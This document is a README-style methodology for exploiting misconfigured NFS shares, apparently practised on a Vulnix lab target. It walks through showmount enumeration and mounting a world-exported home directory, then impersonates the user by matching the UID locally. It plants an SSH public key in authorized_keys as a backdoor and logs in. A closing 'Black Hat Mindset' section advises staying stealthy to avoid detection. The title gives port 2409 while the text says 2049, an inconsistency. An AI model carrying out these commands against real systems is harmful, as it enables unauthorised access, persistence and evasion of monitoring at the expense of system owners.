# Basic Methodology - Port 2409 (NFS)

This README outlines a methodology for exploiting Network File System (NFS) services running on port 2049. The focus is on enumerating NFS shares, mounting remote directories, and exploiting weak permissions to gain unauthorized access, including SSH access via UID manipulation.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating NFS Shares](#enumerating-nfs-shares)
- [Mounting and Exploiting NFS Shares](#mounting-and-exploiting-nfs-shares)
- [Gaining SSH Access via UID Manipulation](#gaining-ssh-access-via-uid-manipulation)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

NFS, running on port 2049, allows remote systems to mount and access directories over a network. Misconfigured NFS shares, especially those with overly permissive export settings (e.g., allowing access to `*`), are prime targets for exploitation. This guide covers enumerating NFS shares, mounting them, and exploiting weak permissions to gain SSH access by manipulating user IDs (UIDs).

## Setup and Prerequisites

To begin, ensure the following:

### Environment
- A Linux host (e.g., Kali Linux) with network access to the target NFS server.

### Tools
- Install NFS client tools (e.g., `sudo apt install nfs-common` on Debian-based systems).
- Ensure `showmount`, `mount`, and SSH tools are available.

### Requirements
- Target Information: Obtain the target IP address (e.g., `192.168.1.132`).
- Privileges: Root access on the attacking machine to create users and manipulate UIDs.

## Enumerating NFS Shares

Use `showmount` to gather information about the NFS server's shares.

### Commands

**List All Mount Points:**
```bash
showmount -a 192.168.1.132
```
Displays all clients currently mounting shares from the NFS server.

**List Available Directories:**
```bash
showmount -d 192.168.1.132
```
Shows directories available for mounting.

**List Export List:**
```bash
showmount -e 192.168.1.132
```

Example Output:
```
Export list for 192.168.1.132:
/home/vulnix *
```
Indicates the `/home/vulnix` directory is exported with universal access (`*`).

### Notes
- Look for exports with permissive settings (e.g., `*` or `no_root_squash`), which allow unauthorized access or root privilege retention.
- Use nmap with NFS scripts (e.g., `nmap --script nfs* 192.168.1.132`) for additional enumeration.

## Mounting and Exploiting NFS Shares

Mount the remote NFS share to interact with its filesystem.

### Commands

**Create a Local Mount Point:**
```bash
mkdir -p /mnt/vulnix
```

**Mount the NFS Share:**
```bash
mount -t nfs 192.168.1.132:/home/vulnix /mnt/vulnix
```

**Test Permissions:**
```bash
mkdir -p /mnt/vulnix/.ssh
```
- If permission is denied, proceed with UID manipulation (next section).
- If successful, the share allows write access, enabling further exploitation.

### Notes
- Ensure the NFS share is mounted correctly (`df -h` to verify).
- Permissive exports may allow direct modification of sensitive directories (e.g., `.ssh`).

## Gaining SSH Access via UID Manipulation

Exploit NFS share access to create an SSH backdoor by matching the target user's UID.

### Steps

1. **Create a Local User with Matching UID:**
   ```bash
   # Assume the target user vulnix has a UID of 2008 (discover via enumeration or trial)
   sudo useradd -u 2008 vulnix
   ```

2. **Switch to the Local vulnix User and Create .ssh Directory:**
   ```bash
   su vulnix
   cd /mnt/vulnix
   mkdir .ssh
   ```

3. **Generate SSH Key Pair as Root:**
   ```bash
   su root
   ssh-keygen
   cat /root/.ssh/id_rsa.pub
   ```
   Copy the public key (e.g., `ssh-rsa AAAAB3NzaC1yc2E...`).

4. **Add Public Key to authorized_keys as vulnix:**
   ```bash
   su vulnix
   cd /mnt/vulnix/.ssh
   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1rYFvo6Wh4j44p4s6WfDYb637m62zA0CwE5t9K6iKbosZMpeDBGP2q8C2O3yw2P9Dhv3jRPCutf1ruadaMxxiOY8Ook/3fwMcaueCAs0ThKCMRlnf0yzUnEHH7t82MrEghMnL4GfUcYlxIwo8d5jQe7umuJneYK786iDNEPaEajC45GQlrZWCzIWqs3B3vJBQ4FR766EHsmiKVWvQ35uR69/O39IePJQ8oSTF+PK0RoCtvmYt44jeqUO0NfYGeCGwqtYW/i+ILTOkW45bYRVjhmrJ2C+yjtK3bsmDiq28IT9STCFlkI7OqEfJkeYqBSJVqVqOkFFvx4+7fyTpchT/" > authorized_keys
   ```

5. **Log in via SSH as Root:**
   ```bash
   su root
   ssh vulnix@192.168.1.132
   ```
   The SSH server recognizes the authorized_keys file, granting access as the vulnix user.

### Notes
- UID matching is key; NFS trusts the client's UID, allowing local user manipulation to impersonate target users.
- Ensure the `.ssh` directory and `authorized_keys` file have correct permissions (e.g., 700 for `.ssh`, 600 for `authorized_keys`).
- If SSH access fails, verify the NFS share's write permissions and the target user's UID.

## Black Hat Mindset

To exploit NFS effectively, think like an attacker:

- **Target Misconfigurations**: Focus on NFS exports with `*` or `no_root_squash`, which allow broad access or privilege escalation.
- **Enumerate Thoroughly**: Use `showmount` and NSE scripts to identify all accessible shares and their permissions.
- **Exploit UID Weaknesses**: Manipulate local UIDs to impersonate target users and gain access to their home directories.
- **Stay Stealthy**: Minimize filesystem changes and SSH login attempts to avoid detection by monitoring systems.

## Resources

- [NFS Documentation](https://nfs.sourceforge.net/)
- [showmount Manual](https://linux.die.net/man/8/showmount)
- [NFS Security Best Practices](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/managing_file_systems/securing-nfs_managing-file-systems)
- [NFS Enumeration with Nmap](https://nmap.org/nsedoc/scripts/nfs-ls.html)

